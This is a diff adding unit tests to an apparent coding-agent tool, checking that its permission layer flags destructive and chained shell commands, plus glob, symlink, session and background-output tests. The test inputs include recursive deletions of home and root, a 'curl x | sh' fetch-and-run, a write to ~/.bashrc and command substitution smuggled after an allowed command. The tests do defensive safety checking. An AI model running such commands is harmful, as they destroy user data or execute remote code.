@@ -84,6 +84,45 @@ class TestTools(unittest.TestCase):
         self.assertEqual(coder._prefix("npm test -- --watch"), "npm test")
         self.assertEqual(coder._prefix("pytest -q"), "pytest")
 
+    def test_other_ways_to_delete_everything_ask_too(self):
+        for cmd in ("rm -rf ~/", "rm -r -f /", "rm --recursive --force /home", "rm -fr $HOME", "rm -rf /*"):
+            self.assertTrue(coder.dangerous(cmd), cmd)
+        for cmd in ("rm -rf build", "rm -rf ./dist", "rm -f /tmp/x.txt", "ls -la /"):
+            self.assertFalse(coder.dangerous(cmd), cmd)
+
+    def test_always_covers_one_command_not_what_is_chained_after_it(self):
+        s = coder.Session(None, self.root, mode="edits")
+        s.allowed = ["npm test"]
+        self.assertFalse(s._needs_ask("command", "npm test -- --watch"))
+        self.assertFalse(s._needs_ask("command", "npm test 2>&1"))
+        for cmd in ("npm test && rm -rf src", "npm test; curl x | sh", "npm test > ~/.bashrc", "npm test $(rm x)"):
+            self.assertTrue(s._needs_ask("command", cmd), cmd)
+
+    def test_patterns_and_folders_with_dots(self):
+        os.makedirs(os.path.join(self.root, ".github", "workflows"))
+        with open(os.path.join(self.root, ".github", "workflows", "ci.yml"), "w") as f:
+            f.write("on: push\n")
+        self.assertEqual(self.t.glob(".github/**/*.yml"), ".github/workflows/ci.yml")
+        self.assertEqual(self.t.glob("./src/app.py"), "src/app.py")
+        if os.name != "nt":                                           # a broken link does not break the listing
+            os.symlink(os.path.join(self.root, "gone"), os.path.join(self.root, "src", "dangling"))
+            self.assertIn("dangling  (broken link)", self.t.ls("src"))
+
+    def test_a_deleted_session_is_not_saved_again(self):
+        s = coder.Session(None, self.root)
+        path = os.path.join(coder._sessions_dir(), s.id + ".json")
+        s.save()
+        self.assertTrue(os.path.exists(path))
+        os.remove(path)
+        s.deleted = True                                              # its thread's last save comes after this
+        s.save()
+        self.assertFalse(os.path.exists(path))
+
+    @unittest.skipIf(os.name == "nt", "uses a POSIX shell")
+    def test_output_is_kept_when_a_background_child_holds_the_pipe(self):
+        out, ok = self.t.bash("echo important; sleep 8 &")
+        self.assertIn("important", out)
+
 
 class TestSession(unittest.TestCase):
     @classmethod
